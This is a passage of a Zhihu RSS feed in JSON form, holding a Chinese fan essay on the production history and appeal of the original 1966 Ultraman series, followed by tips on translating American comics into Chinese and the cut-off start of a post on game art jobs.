</p>\n<p>既然TBS提出了要求，那円谷方就要改企划，但是这些要求，当时円谷表示没见过啊，跟之前提到过的TBS方的栫井巍交流，对方也语焉不详，最后，还是那个最懂特摄的人拍板：我们模仿老美的超人，搞一个我们的超级英雄。到这里，这个英雄的方向终于定下来了。 主角的方向定下来了，那就自然要去设计形象，于是，金城就带着新的要求，去找到了成田亨。</p>\n<h3> 关于皮套设计</h3>\n<p> 成田亨接到要求之后，给了一个这样的设计稿：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d39735607aadaf85329a7de016883a55_720w.jpg?rss\" data-rawwidth=\"550\" data-rawheight=\"994\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d39735607aadaf85329a7de016883a55\" data-watermark-src=\"v2-9e5ff9cc4f1beb2d0b3e719536881771\" data-private-watermark-src=\"v2-70352bf16b14ec54cdc6ebeba7eabd40\"></p>\n<p>当时这个东西还是叫雷德曼，或者直译的话，红超人。当然这个名字应该很快就改名叫奥特曼了，但是当时还是叫红超人。这个皮套因为种种原因，没有得到通过。这个时候呢，成田亨也差不多想出了一套设计的理论，之前我在赛文的回答里讲过，这里再搬运一下：</p>\n<p>成田亨先生的设计理念，是扎根于古希腊著名哲学家柏拉图先生提出的“混沌”（chaos）与“秩序”（cosmos）这一理念。在设计怪兽的时候，由于要让观众，尤其是作为主要受众的儿童察觉到怪兽身上怪的特点，但又不能让儿童感觉不适。在阐述自己的设计理念时，成田亨说：“不要对孩子们说，我们之后的节目，要带大家看一些不健康，让人感到不舒适的东西，如此言行的人没有资格当大人。”基于这种说法，他给自己定下了几条规矩：</p>\n<p> 不能仅仅将动物巨大化，必须融入独创性</p>\n<p>拒绝三头六臂式的畸形化怪兽拒绝满目疮痍，血迹斑斑，让人感到不适的造型</p>\n<p>而为了奉行自己的理念同时又能让怪兽看上去足够“怪”，成田亨先生将抽象性和意外性加入了自己的怪兽的设计中。那么，对于和代表“混沌”的怪兽对立代表“秩序”的巨大英雄，就应该是简洁的，流畅的“美的巨人”。 基于这种想法，初代曼最后诞生了</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f08381a151e11fd6cf4ce2616204534b_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1633\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f08381a151e11fd6cf4ce2616204534b\" data-watermark-src=\"v2-1e729f015b95f9749ff042fafc31761e\" data-private-watermark-src=\"v2-a470beb23ca2ad29fe6cdbd9b4d34f8b\"></p>\n<p> 我们可以看到，初代曼的身体的颜色，基本分为红银两色，在成田亨的设想中，红色是有机的颜色，代表生命，而银色是无机的颜色，所以其实这个也可以解决蛮多人的一个问题：奥特曼究竟有没有穿衣服？</p>\n<p>答案是：穿了，但没完全穿。红色和银色交织在一起，那不就是穿了又没完全穿嘛。</p>\n<p>同时，初代曼整体的身材偏瘦，或者说是苗条，这是为了符合”宇宙人“的质感。</p>\n<p>然后我们注意到这个脸部，这个脸部参考了两个东西：一个是佛像，另一个是古希腊的雕塑。成田亨认为，真正的强者在面对敌人的时候，脸上也是要带有一抹微笑的。就这样，我们的奥特曼，来了。</p>\n<p>等等，是不是有哪里不太对？彩色计时器呢？</p>\n<p>其实，初代曼的设计，从一开始就没有彩色计时器，成田亨构想的奥特曼，是完美的生物，但是円谷那边表示：不行啊，一定要限制特摄部分的时间，哪有那么多钱来烧，因为这个原因，最后就在初代曼的胸口上加上了那个标志性的东西。</p>\n<p>企划有了，皮套也有了，那就应该开始投入拍摄了，下面，就是这些staff们大显身手的时间了。</p>\n<h3>关于staff们 </h3>\n<p>皮套有了，企划有了，那接下来就要投入紧张刺激的拍片工作了。拍片的工作呢，是由円谷和TBS合力的。TBS方面自然要派出自己的演出家参与这个工作，TBS方的栫井想了一下，决定找之前在奥特Q里就担当过脚本的饭岛敏宏来拍第一块的剧集。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4e6a3f831018b742cd4f284749e5b2ea_720w.jpg?rss\" data-rawwidth=\"1108\" data-rawheight=\"622\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4e6a3f831018b742cd4f284749e5b2ea\" data-watermark-src=\"v2-62fd8050526472e8cb2388a260020126\" data-private-watermark-src=\"v2-9d05e85a181c1f6ff59e097f90a559a3\"></p>\n<p>这个时候，对初代曼比较熟悉的观众可能就会有问题了，初代的第一集《超人作战第一号》，不是円谷一担任监督的吗？这里，我说明一下这个事情。</p>\n<p>我们如果仔细的去看初代的剧集目录，会发现他又两个排序，一个是播出顺序，另一个是制作顺序，从播出顺序上，超人作战第一号自然是第一集，但是从制作顺序上，他其实是第五本，而制作顺序上的前三本，则是第二集《打击侵略者》，第四集《食虫草的秘密》，以及第三集《科特队出击》。制作顺序上排行前三的三本，都是由饭岛敏宏来负责的。 </p>\n<p>但是这事情呢，其实比较缺德，因为当时是处于一种连台本都没有的状态，也就是说这东西除了一个企划之外其他的基本为0，因此，栫井想了个更缺德的点子：自己不说，把锅甩给金城哲夫。</p>\n<p>金城和饭岛也是老相识了，奥特Q里的《2020的挑战》这一回就是金城和饭岛合作的作品。金城去给饭岛传达指令的时候，还带来了三个任务：</p>\n<p>1.第一块一共有三本，全部交给饭岛来拍，而一般情况下第一块有且只有两本</p>\n<p>2.拍摄使用一班制，而平时円谷的动真格的作品一律为二班制。 </p>\n<p>这两个要求再加上之前说的朦胧状态的剧集，大家可以理解为什么要让金城去传达指令了，大家应该也能想到，饭岛当时的那种震惊加震怒的状态。 </p>\n<p>但再怎么样，活儿上面交给你了，再咋样还是得干。既然没有脚本，那只能硬着头皮自己上了，于是饭岛又拿起了千束北男的笔名，写了《打击侵略者》的脚本，这一本不写不要紧，一写，写出了一个全系列塑造地最好地外星人：巴尔坦星人出来。</p>\n<p>在第一块除了饭岛敏宏这个监督之外，还有一个人也在奋力拼搏，这个人，就是高野宏一。</p>\n<p>高野宏一算是英二的亲传弟子了，在拍《打击侵略者》的时候，这人其实还只是特技摄影，当时的特技监督是另一个大牛的场彻。但是的场因为业务繁忙，他还挂着另一部《快兽布斯卡》的特技监督，所以实质上这一话的特技监督是高野宏一干的。这个人我愿称之为円谷诸葛亮，真真是鞠躬尽瘁死而后已。当时初代和巴尔坦的那个极其有魄力的空中战，就是高野宏一的杰作。 </p>\n<p>我们再说回饭岛敏宏，在接下了栫井的任务之后，饭岛就要去和円谷那边接洽，然后呢，市川利明就又给了他一个big fxxking surprise，确切的说，不是一个，是五个，而这五个里最致命的其实是以下两个：</p>\n<p>第一个是胶卷的要求。比较致命的是1.5倍容许量，就是说你最多使用片子所需胶卷长度的1.5倍，这基本就是不可能的任务，因为胶卷这玩意你拍出来了啥只有你洗出来以后才直到，而超过容许量就是浪费胶卷，就要写检讨（这也是传统艺能了）。</p>\n<p>第二，每集光学合成镜头小于等于3个，这个就更致命了，大家想一下这个事情，人和怪兽同时出现就是一个，科特队员的射线枪又是一个，光线又是一个，这就三个了，怎么想怎么是不可能的任务，这就导致饭岛后面只能去PUA光学摄影师中野稔，不过中野确实不负円谷之名，在艰苦的条件下完成了任务。 </p>\n<p>除了拍摄第一板块得饭岛敏宏和高野宏一之外，我还打算介绍另外两个staff：円谷一和金城哲夫。 </p>\n<p>先说金城吧，这人大家都熟悉，之前也频繁出场过了，作为企划室长（共两名成员），权力很大，但同时大家不要忘了，金城哲夫是一个非常优秀的脚本家，而且全篇金城经手的剧本，都充满了一种正气在，他在初代曼的脚本都是很正能量的，比如《小英雄》里对井手的纠结与成长的刻画，再比如《怪兽殿下》这个最能体现初代曼精髓的两回，也是金城的手笔。可以说，金城无论是对这个系列的企划，还是自己的本职工作脚本，都完成得十分称职并且优秀。 </p>\n<p>另一个值得一提的，就是本篇监督円谷一。从他的姓氏就能看出来，他是円谷英二老爷子的儿子，也是著名的快手监督。円谷一其实也是很有水平的创作者，可惜的是他的才能被他的父亲英二所掩盖。这个人在初代中只是监督中的一员，他的光辉，还要等到5年后的1971年，才能完全显出。 </p>\n<h2>剧集评价</h2>\n<p>讲完了部分重要的staff和制作初期的趣事，我们可以来关注剧集了，剧集的部分，因为本身初代就分为本篇和特摄两个部分，因此，我对剧集的分析，也会分为这两个部分。那么我们就从本篇先开始。 </p>\n<h3>本篇之一：有趣的故事</h3>\n<p>这是初代曼的魅力的最核心的的东西：有趣的故事。我们一定要知道的是，无论是多么深刻隐晦的隐喻，还是对宗教等意识形态的融合，抑或是某些监督对构图和画面的追求，都是建立在一个有趣的故事是的基础上的。故事好，这些东西才是有根本的东西，才能立得住，否则这些东西都只能被某些极端粉丝天天挂在嘴边念叨。 </p>\n<p>我们知道，平成年代的奥棚有个叫八木毅的大牛，他在拍摄以初代为模仿对象的麦克斯的时候，提炼出了六个点，分别用六个以s打头的英语单词描述：story, simple, S.F, strong, speed以及sense of wonder。 </p>\n<p>story，指整部作品以单元剧的形式进行，要求每个单元剧都要有一个精彩的故事，并且最大限度得体现出脚本家和监督的风格。</p>\n<p>Simple，指剧情要简洁明快，让观众有一种爽快的感觉。这里需要大家注意的是：simple不是easy，这里的simple我个人认为更多的是对剧情结构的要求。</p>\n<p>S.F，指science fiction，指作品要有一种科幻感，因为既然是科学空想特摄，那自然要有一种科幻感。这也是在和TBS开会之后，TBS方提出的重要要求之一。</p>\n<p>Strong，指剧中的英雄一定要是一个强大的英雄。</p>\n<p>Speed，指剧情发展要快速，通过快节奏的剧情让观众无法移开眼睛。</p>\n<p>Sense of wonder，指作品要有一种奇幻感，能够激发观众的好奇心。</p>\n<p>这六个S是八木在制作麦克斯的时候的想法，但是这六个S放在初代中也一样适用。</p>\n<p>初代的故事无疑是十分精彩的，无论是对外星人的想象，还是对怪兽的塑造，这些东西都组合在一起，成为了有趣的故事的组成部分。甚至可以说，初代的39个剧集，没有一个是无聊的剧集，这也是为什么我认为初代是可以作为所有这个类型的剧集的范本的原因。</p>\n<p>有趣的故事，这是一切的核心。 </p>\n<h3>本篇之二：敌役塑造 </h3>\n<p>第二个比较重要的东西，就是初代的敌役塑造。之前我在哥斯拉的回答里写到过，特摄的兴盛和怪兽是分不开的，因此，对怪兽的塑造，其实是构成初代曼的魅力的一个非常重要的方面。 </p>\n<p>我们一定要知道的是，怪兽是怪兽，但又不是怪兽。 </p>\n<blockquote>“战争”的起因是过度的经济活动，这种扭曲的过度经济活动以不受欢迎的方式出现，横冲直撞，这就是怪兽的概念，怪兽不是怪兽。 </blockquote>\n<p>这是饭岛对怪兽这个东西的想法，我认为是非常有道理的。 </p>\n<p>比如说，人类造发电厂，那就有内隆嘎出来吸食电力，大肆破坏；人类开发核工业，那就会有加勃拉出来吃铀；因为核试验而最终毁灭了自己的文明的巴尔坦星人更是直接被饭岛称为“我们文明的另一种未来”，这些东西都是构成怪兽以及宇宙人的魅力的重要组成部分，因为他们确实和我们人类息息相关，越是这样的塑造，越能给观众制造出恐惧感来。 </p>\n<p>但除此之外，我们淡化怪兽作为人类活动的产物的这一方面，单纯地看这些怪兽，其实也是非常有趣且真实的。 </p>\n<p>举个例子，《怪兽殿下》中的哥莫拉，在自己的尾巴被打断之后，面对初代的进攻，依旧会想到用尾巴来还击，这就是非常符合动物本能的塑造。 </p>\n<p>而巴尔坦星人就更不用说了，这种高科技利用克隆工业化生产生命的文明和地球文明之间的冲突，以及这种高科技文明的生物的塑造，包括对火星文化的有机融合，都是经典中的经典。</p>\n<p>其他怪兽，例如以俯察态度面对人类的达达，后世无脑铁憨憨干架王的鼻祖雷德王，都是初代中十分精彩的怪兽塑造。正是因为这种怪兽的塑造以及对怪兽的重视，才让初代有资格成为一部优秀的作品。</p>\n<p>这里插一句，说点别的，自从进入平成年代以来，奥系列对怪兽的塑造就越来越不上心了，这大概也是和日本特摄的衰败有直接联系的。但是，即使这样，近年来的一些作品对怪兽的塑造也是太不上心了，让人不禁痛心疾首啊。 </p>\n<h3>本篇之三：多元故事</h3>\n<p>要说这个话题呢，我这里得再引入一对监督+脚本的组合，实相寺昭雄和佐佐木守，这两位在初代中合作过不少作品，例如14话《珍珠贝防卫指令》，15话《恐怖的宇宙线》，这两集其实熟悉初代的观众已经反应过味来了，但是大部分人还没反应，那接下来《故乡是地球》，《怪兽墓场》，这些都是这两个人合作的作品。 </p>\n<p>大家有没有发现问题？这两个人的作品，和奥特曼想要表达的主流价值，其实是相悖的。</p>\n<p>奥特曼的主流价值，是人类是值得守护的，奥特曼是正义的，但是在这两个人的笔下，一切似乎都不是这个样子的。奥特曼的正义被画上了问号，人类是否值得守护也被画上了问号。 </p>\n<blockquote>“如此写作特摄剧的同时，我想的是宇宙人真的是地球的侵略者吗。确实有明确瞄准地球展开侵略的宇宙人，但不是也有很多宇宙人只是偶然地经历了一系列巧合与变故，所以才坠落到了地球之上。只是因为外形与说的语言和我们不同而与之战斗将其驱逐，这正是地球人的自私，反过来不也是侵略野心的原点吗。如果再加上欲望，便会成为战争的理由。过去日本侵略亚洲与太平洋地区的基础应该就在这里。现在隐藏在与侵略的宇宙人战斗的大义名分之下的，不正是我们在不知不觉中酝酿出的战争的气氛吗。这正是‘地球人是宇宙之敌’，而‘日本人是地球之敌’的趋势。” </blockquote>\n<p>这是佐佐木守在讲解自己关于“怪兽墓场”这一回的创作思路的想法，从中我们可以明显得看到他对奥特曼这个系列的主流价值观的叛逆与质疑</p>\n<blockquote>“曾经存在于明治初期知识分子之间的振兴东亚的理想，在昭和时期被充当东亚霸主这一实际利益所取代，尽管仍然打着解放被西方殖民者占领的东亚这一招牌，但是在具体实践中，昭和知识分子已经没有如同冈仓天心诗意地描述‘亚洲是一体’时的那种余裕了”。</blockquote>\n<p>在这里我们可以明显地看出佐佐木在用奥特曼传达自己地想法。而实相寺昭雄作为他的搭档，则是对奥特曼精神的更极端的质疑者。在他的手下，科特队是可以被变成搞笑人物的。这种离经叛道的东西，也被初代的拍板团队包容了。正是因为这种兼容并包的精神，才使初代拥有了各种类型各种风格的优秀的单元剧。</p>\n<h3>本篇之四：人物塑造</h3>\n<p>这点其实也不用我说得太多，大家可以去看初代对哪怕出场次数不多得科特队的科学家的塑造，都是非常用心得。我这里只简单提一下井手。 </p>\n<p>要提井手就必须提小英雄这一回，这一回短短的25分钟之内，把井手的纠结，退缩，以及被打醒之后的奋勇，描绘得淋漓尽致，这和金城的非常深厚的笔力是脱离不开的。而每个队员其实都有不亚于井手的塑造。 </p>\n<p>我尤其要讲的是对奥特曼的塑造，在这部电视剧中，真正的主角不是早田，而是奥特曼，是一个充满了神性的奥特曼。</p>\n<p>什么是神性？是像我们平时参拜的那种东西吗？</p>\n<p>我以为，初代曼的神性，不光有“敬”，更有“畏”，这两者缺一不可，一起构成了初代曼的神性。 </p>\n<p>初代曼当然是让人尊敬的，他把核弹运向宇宙，一次又一次地解决人类解决不了地问题，这当然是让人尊敬的形象。 </p>\n<p>但是，从另一方面来说，我们会发现，初代是很无情的存在。初代中由于人类活动而出现的怪兽不在少数，无论是从人类变身而来的贾米拉，还是无辜从天上落下来的史盖顿，或是因为人类的搬运而苏醒的本来人畜无害的哥莫拉，这些都是无辜收到人类行为影响的怪兽，可这些怪兽统统被初代所解决了。如果这些东西放在平成年代，或许会有不一样的结局，但是在初代手下，他们没有一个逃脱被除掉的命运。 </p>\n<p>这就是初代令人敬畏的地方了。即使他对这些怪兽抱有同情，也不会动摇他处理掉这些伤害了无辜者的生物的决心。他或许会在战斗结束后对部分怪兽致以同情，但他不会手软。这才是初代神性的另一方面：畏。 </p>\n<p>《新·奥特曼》的脚本庵野秀明在自己担任脚本的《巨神兵降临东京》这一短片中抛出过一个观点：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-55b55baa4d553d7e871976204c09750d_720w.jpg?rss\" data-rawwidth=\"2095\" data-rawheight=\"901\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-55b55baa4d553d7e871976204c09750d\" data-watermark-src=\"v2-a69d122c856b6da2baad1bcbb692b408\" data-private-watermark-src=\"v2-53dd55f420a03672c89c37ef9a2d7062\"></p>\n<p>我想，这句话用在初代的身上，其实是非常合适的。人类对他的敬，仅仅是因为他选择站在人类这一边而已。 </p>\n<h3>特摄之一：模型与空战 </h3>\n<p>说到特摄部分，首先要提到的，就是円谷对模型的使用和操演。这里我放一段由高野宏一完成的初代和巴尔坦的空战。</p>\n<a href=\"https://www.zhihu.com/video/1399030086855680000\"></a><p>我们可以看到，首先在一个皮套演员完成的实拍起飞动作之后，就进入了模型的操演部分。首先是两个角色的追逐，中间插入一段皮套演员的拍摄，通过调整摄像机的角度，制造出奥特曼在飞的假象，再切换成模型之间的追逐，到了近身搏斗的方式，则是让皮套演员上场的。整个这一段内容称得上是一气呵成，无论是从模型操演，还是通过调整摄像机的角度来制造奥特曼和巴尔坦在飞行得感觉，都做的相当完美，这是非常有魄力的并且完全担得上壮绝的特摄场景。 </p>\n<p>再来看后面一段:</p>\n<a href=\"https://www.zhihu.com/video/1399030005884755968\"></a><p>在初代和巴尔坦的格斗之后，我们能看到追逐与被追逐的交替，巴尔坦在后方攻击初代，这一段的光学合成以及对模型的爆破，都是非常精彩的，最后以初代落地，回首一个斯派修姆光线结束战斗。整个这段空战恢弘，是非常有魄力的特摄场景。 </p>\n<p>说到底，初代曼的魅力，不光在于其本篇的优点，其特摄部分，也是当时世界顶级的制作。</p>\n<h3>特摄之二：光学合成</h3>\n<p>其实这个部分，我主要想讲的是斯派修姆光线的那点事情。</p>\n<p>首先看这个名字，斯派修姆，这个一听就知道是音译，如果意译的话大概是宇宙物质光线，反正这东西被设定成元素周期表133号元素，鉴于现在只发现了118种，所以人们现在肯定找不出这东西，但是鉴于还可能存在未知元素，所以也未必就没有，用在这个名字主要是为了满足一种科幻感。 </p>\n<p>然后讲一下，为什么这个东西是十字形的手势。当时设计这个光线的时候，其实是有两种选择的，第一种就是线形的光线，就是类似艾梅利姆光线的那种，还有一种就是宽幅的光线，就是现在我们看到的这种。円谷这边一开始，实际上的特技监督高野和挂牌的特技监督的场商量了一下，想法是从之间发出线形的光线。 </p>\n<p>但是这个想法被中野稔，也就是光学摄像给否了，他觉得这样和科特队的成员的射线就没区别了，必须是更石破天惊的那种光线，这个想法也得到了饭岛敏宏的认可，于是高野就说从整个手掌发出光线试试看，这个想法得到了大家的认可。 </p>\n<p>中野又表示发射的时候手掌不要动，否则会影响光学合成的效果和质量，于是在这两点要求的前提下，通过不断让古谷敏摆姿势最终确定了这个十字形的手势。 </p>\n<h3>特摄之三：关于“动作戏”</h3>\n<p>先讲一个事情：初代曼整部作品，是没有杀阵这个职位的，也就是说，没有专业的武术指导来指导皮套演员打架。</p>\n<p>那有的人可能就有疑问了，没有武术指导，那打得能好看吗？</p>\n<p>答案是：没人在乎打得好不好看。 我们把时间往回拨，拨到1954年，担任哥斯拉皮套演员的中岛春雄就这个问题问过円谷英二，英二的回答是：你想做什么动作就做什么动作。</p>\n<p>因为拍的是特摄电影，所以动作元素并不重要。但是放在奥特曼里，这个就有点行不通了，因为毕竟有个巨大人型生物在这边晃来晃去的，你让他完全不考虑格斗元素也不现实。</p>\n<p>但是问题在于，担任奥特曼的皮套演员的古谷敏，他不是动作戏出身的。这个时候，我们的高野桑就又站了出来：实在不行我来吧。</p>\n<p>于是，除了特技监督，特技摄影之外，我们的高野桑又开始兼任杀阵，指导古谷敏和其他的皮套演员的打架的场面。 </p>\n<p>但是，我们一定要知道的是，高野桑的本职工作，是特技监督，他设计动作的一个非常核心的要点就是：动作要能为体现特殊技术做辅助。也就是说，动作只是为了让特摄场面更有观赏性的辅助元素。</p>\n<p>所以呢，可以说在奥系列里，不能体现特摄技巧的格斗场面，其本身的价值是非常有限的，所以现在部分人动辄“打戏分析”，动辄“打戏好”，倒也不是说不行，但总归有点舍本逐末了。 </p>\n<h2>来了，我们的奥特曼</h2>\n<p> 1966年4月1日，是奥特曼第一次出现在大众媒体的日子，可是这天的情况却并不顺利。穿上皮套，戴上面具的古谷敏根本什么都看不见，只能被人牵着走来走去，饭岛，高野这些负责第一块的工作人员都面面相觑，心想这还怎么得了，还是的场彻见过世面，急中生智在面具上开了两个窥孔，这才让古谷摆脱了零视野的状态。 </p>\n<p>就在这种混乱的时刻，円谷英二来了，他抬头看着古谷敏（因为古谷敏太高了），一边拍了拍他的肩膀，一边问：奥特曼，怎么样？痛不痛苦，能看见吗？能听得见吗？ 老爷子还说了点别的东西，只是因为太热了，皮套又有隔音效果，导致古谷敏没听清他说了什么，多年以后才知道老爹说的是“梦想啊，要给小孩子梦想”。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-653434a222bb71d07a5656e472569a09_720w.jpg?rss\" data-rawwidth=\"674\" data-rawheight=\"1008\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-653434a222bb71d07a5656e472569a09\" data-watermark-src=\"v2-fb391b6388ca806e7ff86bd23fa7d6f5\" data-private-watermark-src=\"v2-7d2ac8df2bf41192615455e946e38c74\"></p>\n<p>正是建立在这样的信念上，那个红银相见的巨人出现在了荧幕上，并成为了一代又一代孩子的童年记忆。我们的奥特曼，来了！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/kazamori-masaki?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">风森正辉</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/265413321/answer/1996395962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">38 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/335062212?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">除了初代以外的哪个奥特曼更能代表奥特曼系列？</a><br><a href=\"http://www.zhihu.com/question/29112455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何单凭脸部来分辨初代、杰克和佐菲三个奥特曼？</a><br>\n","link":"http://www.zhihu.com/question/265413321/answer/1996395962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"翻译漫画有哪些需要知道的要点或技巧？","date":"2021-07-18 04:00:09","description":"\n<p>看了大部分回答都是讲日本漫画的，我从美漫汉化的角度讲一些经验吧：</p>\n<hr>\n<p><b>1. 注意语句通顺</b></p>\n<p>很多想加入汉化组当翻译的小伙伴第一句问的就是“需要六级几分？”实际上从我个人的经验来看，相比英文水平，更重要的是中文水平。英语看不懂，借助查字典甚至机器翻译，大部分的意思都能搞懂。但是，把它变成一句读起来通顺流畅的中文，并没有想象中的那么容易。</p>\n<p>有一次我做校对，那个译文我真的是一个字都没看懂，仿佛古神的低语……汉化组嘛，大家都是用爱发电，也不好意思说什么，最后我受不了了，直接从头到尾重新翻译了一遍。所以，翻译出来之后自己先把译文读一遍，先确保读者能看懂，再说其他的。</p>\n<p>在这里我给大家提供两个英文翻译成中文的小窍门：第一是把复杂句的从句拆出来变成简单句，第二是把被动句改为主动句并且补上主语。这两个小窍门可以在很多情况是解决“把英文表达方式转换为中文常见的表达方式”的捷径。当然了，这两个小窍门也不是时时都能用，因为在不同的场景和语气下，台词所需要强调的内容可能跟这些语法有关系，这个就要具体情况具体理解了。</p>\n<hr>\n<p><b>2. 注意用语场景</b></p>\n<p>说到这里也想吐槽一下好多人的一提到翻译脑子里就冒出“信达雅”，一堆大白话被翻译成自以为高雅的文白夹杂的“古风”还被盲目追捧，我看起来实在浑身尴尬。漫画里很多表达就是口语，翻译成大白话，简单直接就行了。</p>\n<p>当然，这就涉及到人物语气的问题，也有一些小窍门跟大家分享：如何让译文看起来更像口语？从自己生活日常的语言来取材！例如，把“我们”换成“咱们”，把“什么”换成“啥”，把“小时”换成“钟头”等等。不过，这就引出了另一个问题：中文里很多口语化的表达其实是带有地方性或者说方言色彩的，比如儿化音，“外婆”和“姥姥”之间的区别等等。这时候就出现了一条很微妙的线：“接近中文口语化”和“听起来像四川/东北/天津/xx人”之间的区别到底在哪？读者体验又会是什么样？</p>\n<p>我个人的追求还是更接近“异化”，让读者体验到原文的语境，所以我的习惯是尽量少用成语，少用方言，少用带中文典故的词，少用中文网络流行语。当然了，这个就是翻译理念的区别了，也有喜欢追求“归化”的译法，这就见仁见智了。翻译是一种再创造，很多情况下需要译者自己把握这条界限，也需要多听取读者的反馈，不断调整自己的做法，这个说起来话题就大了，需要大家自己多学习，多训练，形成自己的风格。</p>\n<hr>\n<p><b>3. 注意语言的韵律感和节奏感</b></p>\n<p>这一点其实是难度颇大的，主要是因为在英文中，很多词在口语和书面语中是通用的；或者换个方式说，英文的口语词并不一定就会显得“俚俗”。而同样意思的中文词，却又往往口语词只在口语中用，而书面语完全是另一个词，这时候再试图追求原文的韵律或者节奏，要么像打油诗或者rap，要么就掉进前文说的“古风”陷阱。这一点其实我个人也没有什么完全的解决办法，只能建议大家根据具体情况具体分析，同时要去熟悉一些英文文学中比较特有的行文方式：例如押头韵、不同抑扬格的格式等等。首先别把这些东西漏了，之后就看译者的功力了。当然假如实在翻译不出原文的韵律，也不必灰心，这本身就是很难的事。把意思翻译出来，加个注释把原文的特殊格式解释给读者也不失为一个选择。</p>\n<hr>\n<p><b>4. 漫画语言的特点</b></p>\n<p>上面三点其实对于很多通俗作品都适用，同时，漫画这个媒介本身有自己的特点。比如：</p>\n<p>a. 对话框的大小已经被原文固定了，所以，翻译出来的中文内容，最好能根据需要调整长度，达到占用的空间能和英文内容差不多，这样子填字后看起来更加美观。</p>\n<p>b. 注意翻页的悬念：漫画里最常见的一种创作手法是，把一句完整的话分成两部分，前一半在翻页之前的最后一个旁白框/对话框，后一半在翻页之后的第一个旁白框/对话框；或者说“翻页前提出问题，翻页后给出答案”这样制造悬念，吸引读者翻页的做法。这时候要特别注意，因为许多英文句子很可能是要调换个顺序，中文才更通顺，这时候或许就跟要制造的悬念冲突了。这也就是我上文提到的复杂句改简单句/被动句改主动句的时候往往不适用的地方。这时候怎么翻译，就看出译者的功夫来了，很多情况没有一个通用原则，需要大家自己多尝试，提高自己的水平。</p>\n<p>c. 填字时候的要点：其实各个汉化组自己都有一些相应的填字规则，我大概说一下自己喜欢的用法吧。</p>\n<p>首先，尽量用半角标点符号，因为全角符号会导致空出半个格子，在对话框里很扎眼；</p>\n<p>其次，填出来的段落形状尽量符合对话框的形状，例如椭圆形对话框，就把段落填成中间一行最长，往上往下每行都逐步缩短，这样把段落形成一个椭圆形，读起来观感佳；</p>\n<p>第三，一个词中间尽量不断行，读者阅读更舒适；</p>\n<p>第四，中文没有原生的斜体，所以原文的如果有斜体，到了中文最好换一种强调方式，因为中文的斜体实在是太难看了；</p>\n<p>第五，我个人比较喜欢在普通对话框里使用无衬线字体，比如微软雅黑、黑体等等。在我看来，这种用法比较接近美漫中绝大多数对话框采用大写字母的意图：在小空间内使用尽量简洁整齐的填字方式，更易读。</p>\n<hr>\n<p>另外，我看到其他许多回答说的“要注意俚语、术语和特殊表达方式”等等，其实我觉得这个是翻译的基础要求，就是“弄懂原文”，这个都没做到的话，其他一切都无从谈起。所以我并不特别强调这个，因为我觉得只要是认真的译者，都会把可能出现的、自己不明白的表达方式都给查清楚了，再开始翻译。看不懂别硬翻，多查多问。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xiao-yao-81-38?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">肖尧</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/351873262/answer/2003865793?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">5 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/312024044?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">日文原版漫画到哪里去买？</a><br><a href=\"http://www.zhihu.com/question/368229455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些好的漫画适宜睡前阅读？</a><br>\n","link":"http://www.zhihu.com/question/351873262/answer/2003865793?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"游戏美术岗位，哪个最苦逼？","date":"2021-07-18 03:00:08","description":"\n<p>一入画圈深似海，从此头发是路人。</p>\n<p><b>游戏美术的养成需要经过多年苦练，</b></p>\n<p><b>根据分工不同又都各有难点。</b></p>\n<p>我们探访了部分美术同学，</p>\n<p>听听他们是如何“吐槽”自己岗位的。</p>\n<hr>\n<h2>日常卡稿的角色原画师：</h2>\n<p>对原画师来说，</p>\n<p><b>郁闷的一点是经常被弄混。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6f47d802dab1b296ea87b126c14691e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"198\" data-rawheight=\"171\" data-watermark=\"original\" data-original-src=\"v2-6f47d802dab1b296ea87b126c14691e7\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>很多人可能以为原画是这样的：</p>\n<p><img 